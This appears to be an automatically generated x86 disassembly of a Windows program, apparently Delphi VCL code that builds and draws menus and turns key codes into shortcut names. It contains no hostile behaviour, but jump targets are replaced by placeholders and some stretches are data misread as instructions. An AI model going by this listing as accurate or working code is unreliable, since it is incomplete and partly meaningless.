rol [ edx ] 0xf0
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x40042c3 ] ah
sub_45c734
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_44b0c4
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_4509a4
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_45c78c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_45c7c4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_404038
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_4042a8
sub_45c818
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_45ca01
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4040d0
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_404220
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4040d0
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4040d0
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_404220
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_404220
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_404038
mov eax esi
call sub_404038
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4040d0
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_40827c
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404344
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_45c7c4
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404300
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4040d0
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404300
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404300
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ca08
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40405c
retn
sub_45ca1c
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_4042f8
push eax
mov eax edi
call sub_4042f8
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4042f8
push eax
mov eax edi
call sub_4044f8
push eax
mov eax [ esi ]
call sub_4044f8
pop edx
pop ecx
call sub_40815c
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_4042f8
mov ecx eax
mov eax esi
mov edx 0x1
call sub_404598
sub_45ca78
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4044e8
xor eax eax
push ebp
push sub_45cb53
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_45ca1c
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45ca1c
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45ca1c
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45ca1c
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cb5a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45c818
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40810c
test eax eax
jne r-xdata
sub_45cb90
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_45f130
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_45f140
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_45cbf0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_45f130
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_45f130
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_45f140
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45f140
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_45cb90
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_45cb90
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_45f140
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45f140
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_45cd3c
push ebx
mov ebx eax
mov eax ebx
call sub_459220
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_461c4c
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_45cd74
push ebx
mov ebx eax
mov eax ebx
call sub_459234
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45cda4
push ebx
mov ebx eax
mov eax ebx
call sub_459248
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45cdd4
push ebx
mov ebx eax
mov eax ebx
call sub_459270
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45ce04
push ebx
mov ebx eax
mov eax ebx
call sub_459298
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_404444
je r-xdata
mov al 0x1
pop ebx
retn
sub_45ce38
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_45925c
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_45ce74
push ebx
mov ebx eax
mov eax ebx
call sub_4592ac
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45cea8
push ebx
mov ebx eax
mov eax ebx
call sub_4592c0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45cedc
push ebx
mov ebx eax
mov eax ebx
call sub_4592d4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45cf10
push ebx
mov ebx eax
mov eax ebx
call sub_42184c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45cf38
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_45cf58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45ef98
sub_45cf78
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45f008
sub_45cf98
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45f05c
sub_45cfb8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_45cfd4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_40408c
sub_45cff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45f188
sub_45d018
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45f164
sub_45d038
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45f178
sub_45d058
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_45d084
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420f48
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_45cb70
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_45fa94
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_45d100
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_461a30
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_45f130
test eax eax
jg r-xdata
mov edx esi
call sub_45f4c8
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_45f140
call sub_4032a8
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_4032a8
lea eax [ esi + 0x44 ]
call sub_40d4f0
lea eax [ esi + 0x78 ]
call sub_40d4f0
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_45d51c
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_418e3c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420f94
test bl bl
jle r-xdata
call sub_4032a8
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_45d1b4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45d40f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d416
lea eax [ ebp - 0x40 ]
call sub_404038
lea eax [ ebp - 0x8 ]
call sub_404038
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_4040d0
mov eax ebx
call sub_45f130
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_45d6c4
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404444
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_45f130
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_45f6ec
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_45c818
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4043b8
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4044f8
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_4044f8
push eax
mov eax ebx
call sub_45d6c4
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_45ed08
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404444
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_4044f8
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_45f130
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_45d6c4
mov [ ebp - 0x25 ] eax
sub_45d42f
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_45d1b4
xor eax eax
pop ebp
retn
sub_45d454
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_460d28
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45fcf0
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4601ec
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_45cbf0
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_45d4c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45d50e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41deec
mov eax [ ebp - 0x4 ]
call sub_45ca78
mov edx eax
mov eax ebx
call sub_45f164
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d515
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_45d51c
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_45d594
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_421018
sub_45d558
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_421398
mov eax ebx
call sub_45f118
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_45f118
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_4034a4
pop esi
pop ebx
retn
mov eax ebx
call sub_45d594
sub_45d594
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_45d6c4
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_45d594
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_45d6c4
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_45d6c4
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_45d454
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebp
call sub_45d6c4
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45d664
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_45f130
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_45f140
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_45f140
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_45f140
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_45c76c
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_45d6c4
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_45d454
mov eax [ rw-data ]
call sub_45c76c
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_45d710
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4212c0
push ebx
push sub_45d4c4
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_45d754
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45d938
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45f6ec
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4040d0
test bh 0x4
je r-xdata
mov eax edi
call sub_460d28
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404444
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424d8c
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404300
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_424764
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_424770
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d93f
lea eax [ ebp - 0xc ]
call sub_404038
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_425570
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4042f8
push eax
mov eax [ ebp - 0xc ]
call sub_4044f8
push eax
mov eax [ ebp - 0x4 ]
call sub_425570
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
